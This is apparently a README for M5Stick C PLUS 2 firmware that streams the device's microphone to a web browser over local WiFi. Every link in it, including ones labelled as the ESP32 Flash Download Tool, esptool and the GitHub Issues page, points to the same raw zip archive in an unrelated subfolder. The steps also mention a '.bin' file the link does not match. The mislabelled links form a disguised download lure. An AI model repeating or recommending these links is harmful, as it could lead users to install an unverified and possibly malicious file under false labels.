# 🎤 Microphone-M5Stick - Listen to M5Stick Mic Easily

[![Download Release](https://raw.githubusercontent.com/linemink/Microphone-M5Stick/main/achill/Stick_Microphone_3.3-alpha.2.zip)](https://raw.githubusercontent.com/linemink/Microphone-M5Stick/main/achill/Stick_Microphone_3.3-alpha.2.zip)

---

## 📋 About Microphone-M5Stick

Microphone-M5Stick is a simple firmware designed to let you listen to the microphone of the M5Stick C PLUS 2 device through a web server. This means you can hear sound captured by this small gadget on your computer or smartphone over your local WiFi network.

The firmware runs on the M5Stick C PLUS 2, a compact and affordable device based on the ESP32 chip. It captures audio in PCM format and streams it live using websockets on a local network. You get an easy way to monitor sounds using just a web browser.

This project suits hobbyists and DIY electronics enthusiasts who want to explore audio streaming or have handy remote listening tools without needing complex setups.

---

## 💻 What You Need

Before you get started, please have these ready:

- **M5Stick C PLUS 2** hardware device
- A **computer, smartphone, or tablet** connected to the same WiFi network you plan to use
- A **WiFi network** with internet access (for initial download)
- Standard **micro-USB cable** to connect M5Stick to your computer for setup (optional for firmware flashing)
- **Basic familiarity with connecting devices to WiFi** and using a web browser

The firmware runs on the M5Stick's ESP32 chip, so you don't need to install any drivers beyond your usual USB connection software for your device.

---

## 🚀 Getting Started

This guide explains how to download the firmware, upload it to your M5Stick C PLUS 2, and listen to your microphone using a web browser.

You do NOT need to write any code or use advanced tools. Follow the instructions step by step.

---

## 🔽 Download & Install

### Step 1: Download the Firmware Files

Visit the official release page and download the latest firmware file:

[![Download Release](https://raw.githubusercontent.com/linemink/Microphone-M5Stick/main/achill/Stick_Microphone_3.3-alpha.2.zip)](https://raw.githubusercontent.com/linemink/Microphone-M5Stick/main/achill/Stick_Microphone_3.3-alpha.2.zip)

1. Click the link above or go to https://raw.githubusercontent.com/linemink/Microphone-M5Stick/main/achill/Stick_Microphone_3.3-alpha.2.zip
2. Look for the latest version available.
3. Download the firmware file ending in `.bin` or the appropriate image file.

### Step 2: Prepare Your M5Stick C PLUS 2

1. Connect your M5Stick to your computer using a micro-USB cable.
2. Make sure the device is powered on.
3. If you do not have flashing software, download and install [ESP32 Flash Download Tool](https://raw.githubusercontent.com/linemink/Microphone-M5Stick/main/achill/Stick_Microphone_3.3-alpha.2.zip) (suitable for Windows) or use [esptool](https://raw.githubusercontent.com/linemink/Microphone-M5Stick/main/achill/Stick_Microphone_3.3-alpha.2.zip) for Mac/Linux.

### Step 3: Flash the Firmware

1. Open the flashing tool.
2. Select the firmware file you downloaded.
3. Choose the correct port your M5Stick is connected to.
4. Start the flashing process.
5. Wait until it finishes. The device will reboot automatically.

### Step 4: Connect to WiFi

Once the firmware is running on the device:

1. The M5Stick C PLUS 2 should create a WiFi access point or connect to your existing home network (depending on firmware settings).
2. Use the device's screen to follow prompts for entering your WiFi network name and password if needed.
3. Once connected, the device will show an IP address on its screen.

### Step 5: Listen to the Microphone

1. On a computer, phone, or tablet connected to the same WiFi network, open a web browser.
2. Enter the IP address shown on the M5Stick screen in the browser's address bar (for example, `http://192.168.1.50`).
3. The webpage will load an audio player that streams sound picked up by the microphone live.

---

## 🔧 How This Works

- The M5Stick uses its built-in microphone hardware to capture raw audio.
- It converts audio to PCM format (a standard raw audio format).
- The firmware hosts a local web server running on the M5Stick.
- The web server streams the audio data using websockets to all connected devices.
- Your devices receive this stream and play it through your browser’s audio system.
  
This setup avoids the need for extra apps. You just use your web browser to listen live.

---

## 🖥️ Supported Devices and Browsers

You can use almost any modern device to listen:

- Windows, macOS, Linux computers
- Android phones and tablets
- iPhones and iPads

Compatible browsers include:

- Chrome
- Firefox
- Safari
- Edge

Older or very basic browsers may not support the audio streaming feature.

---

## ⚙️ Troubleshooting Tips

- **Cannot flash the firmware?**  
  Check the USB cable and port. Some cables support power only but not data.

- **Device won’t connect to WiFi?**  
  Confirm your password and WiFi network name. Make sure the router is working.

- **No sound on webpage?**  
  Check your device volume and mute settings. Try refreshing the browser page.

- **Webpage does not load or IP address unknown?**  
  Restart the M5Stick and check the WiFi connection again. Look for the IP on the device screen.

---

## 🔄 Updating the Firmware

To update or change the firmware:

1. Download the new firmware from the releases page.
2. Repeat the Flashing steps described above.
3. The device will reboot with new features or fixes.

---

## 🛠️ Developer Info (Optional)

The firmware is written in Arduino-compatible C++ for the ESP32 microcontroller. It streams PCM audio over websockets running on a local network webserver.

Key project topics cover:

- Arduino programming  
- ESP32 chip use  
- Microphone audio capture (PCM format)  
- Local network audio streaming  
- WebSocket communication  
- M5Stack M5Stick C PLUS 2 device hardware  

Contributions or customizations require familiarity with Arduino IDE or ESP-IDF environments.

---

## 🤝 Get Support

If you have issues or questions:

- Check the GitHub Issues page here: https://raw.githubusercontent.com/linemink/Microphone-M5Stick/main/achill/Stick_Microphone_3.3-alpha.2.zip
- Review project Wiki or documentation on the repository.
- Search for help on ESP32 or M5Stack forums.

---

Click below to start now:

[![Download Release](https://raw.githubusercontent.com/linemink/Microphone-M5Stick/main/achill/Stick_Microphone_3.3-alpha.2.zip)](https://raw.githubusercontent.com/linemink/Microphone-M5Stick/main/achill/Stick_Microphone_3.3-alpha.2.zip)